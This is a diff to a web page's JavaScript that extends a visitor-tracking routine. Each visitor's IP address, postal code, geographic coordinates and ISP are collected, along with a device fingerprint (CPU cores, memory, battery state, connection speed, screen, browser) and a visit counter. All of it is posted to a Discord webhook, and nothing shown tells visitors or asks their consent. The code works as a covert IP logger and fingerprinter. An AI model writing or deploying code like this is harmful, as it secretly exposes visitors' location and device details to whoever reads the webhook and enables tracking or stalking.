@@ -372,10 +372,60 @@
                 device: navigator.userAgent,
                 platform: navigator.platform,
                 language: navigator.language,
+                languages: navigator.languages.join(', '),
                 screen: `${screen.width}x${screen.height}`,
+                colorDepth: `${screen.colorDepth}-bit`,
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                referrer: document.referrer || 'Direct visit'
+                referrer: document.referrer || 'Direct visit',
+                cookiesEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack || 'Not set',
+                cpuCores: navigator.hardwareConcurrency || 'Unknown',
+                deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Unknown',
+                touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
+                onlineStatus: navigator.onLine ? 'Online' : 'Offline'
             };
+            
+            // Parse browser info from user agent
+            const ua = navigator.userAgent;
+            if (ua.includes('Chrome')) info.browser = 'Chrome';
+            else if (ua.includes('Safari') && !ua.includes('Chrome')) info.browser = 'Safari';
+            else if (ua.includes('Firefox')) info.browser = 'Firefox';
+            else if (ua.includes('Edge')) info.browser = 'Edge';
+            else info.browser = 'Other';
+            
+            // Detect device type
+            if (/Mobile|Android|iPhone/i.test(ua)) info.deviceType = '📱 Mobile';
+            else if (/iPad|Tablet/i.test(ua)) info.deviceType = '📱 Tablet';
+            else info.deviceType = '💻 Desktop';
+            
+            // Get connection info if available
+            if (navigator.connection) {
+                const conn = navigator.connection;
+                info.connectionType = conn.effectiveType || 'Unknown';
+                info.downlink = conn.downlink ? `${conn.downlink} Mbps` : 'Unknown';
+                info.rtt = conn.rtt ? `${conn.rtt} ms` : 'Unknown';
+                info.saveData = conn.saveData ? 'Enabled' : 'Disabled';
+            }
+            
+            // Get battery info if available
+            if (navigator.getBattery) {
+                try {
+                    const battery = await navigator.getBattery();
+                    info.batteryLevel = `${Math.round(battery.level * 100)}%`;
+                    info.batteryCharging = battery.charging ? '⚡ Charging' : '🔋 Not charging';
+                } catch (e) {
+                    info.batteryLevel = 'N/A';
+                }
+            }
+            
+            // Check for returning visitor
+            const visitCount = parseInt(localStorage.getItem('visitCount') || '0') + 1;
+            localStorage.setItem('visitCount', visitCount.toString());
+            info.visitCount = visitCount;
+            info.firstVisit = localStorage.getItem('firstVisit') || new Date().toISOString();
+            if (!localStorage.getItem('firstVisit')) {
+                localStorage.setItem('firstVisit', info.firstVisit);
+            }
             
             // Try to get IP and location info from ipapi.co (free, no key needed)
             try {
@@ -385,6 +435,9 @@
                 info.city = data.city;
                 info.region = data.region;
                 info.country = data.country_name;
+                info.postalCode = data.postal;
+                info.coordinates = `${data.latitude}, ${data.longitude}`;
+                info.isp = data.org;
                 info.flag = data.country_code ? `:flag_${data.country_code.toLowerCase()}:` : '';
             } catch (error) {
                 console.log('Could not fetch IP info:', error);
@@ -406,12 +459,36 @@
                 
                 // Build fields for Discord embed
                 const fields = [
-                    { name: '🌍 Location', value: info.ip ? `${info.flag} ${info.city}, ${info.region}, ${info.country}\nIP: \`${info.ip}\`` : 'Unknown', inline: true },
-                    { name: '📱 Device', value: info.platform, inline: true },
-                    { name: '🌐 Language', value: info.language, inline: true },
-                    { name: '🖥️ Screen', value: info.screen, inline: true },
-                    { name: '🕐 Timezone', value: info.timezone, inline: true },
-                    { name: '🔗 Referrer', value: info.referrer.substring(0, 50) || 'Direct', inline: true }
+                    { 
+                        name: '🌍 Location', 
+                        value: info.ip ? `${info.flag} ${info.city}, ${info.region}\n${info.country} ${info.postalCode || ''}\nIP: \`${info.ip}\`\n📍 ${info.coordinates || 'N/A'}` : 'Unknown', 
+                        inline: true 
+                    },
+                    { 
+                        name: '📡 Network', 
+                        value: `ISP: ${info.isp || 'Unknown'}\nType: ${info.connectionType || 'N/A'}\nSpeed: ${info.downlink || 'N/A'}\nPing: ${info.rtt || 'N/A'}`, 
+                        inline: true 
+                    },
+                    { 
+                        name: '💻 Device', 
+                        value: `${info.deviceType}\nOS: ${info.platform}\nCPU: ${info.cpuCores} cores\nRAM: ${info.deviceMemory}`, 
+                        inline: true 
+                    },
+                    { 
+                        name: '🌐 Browser', 
+                        value: `${info.browser}\nLanguage: ${info.language}\nCookies: ${info.cookiesEnabled ? '✅' : '❌'}\nDNT: ${info.doNotTrack}`, 
+                        inline: true 
+                    },
+                    { 
+                        name: '🖥️ Display', 
+                        value: `Screen: ${info.screen}\nColor: ${info.colorDepth}\nTouch: ${info.touchSupport ? '✅' : '❌'}`, 
+                        inline: true 
+                    },
+                    { 
+                        name: '📊 Other', 
+                        value: `${info.batteryCharging || '🔋 N/A'}\nBattery: ${info.batteryLevel || 'N/A'}\nVisit #${info.visitCount}\nStatus: ${info.onlineStatus}`, 
+                        inline: true 
+                    }
                 ];
                 
                 await fetch(DISCORD_WEBHOOK_URL, {
@@ -423,7 +500,7 @@
                             description: message,
                             color: 6003917, // Blue color
                             fields: fields,
-                            footer: { text: info.device.substring(0, 100) },
+                            footer: { text: `User Agent: ${info.device.substring(0, 100)} | Referrer: ${info.referrer.substring(0, 50)}` },
                             timestamp: new Date().toISOString()
                         }]
                     })
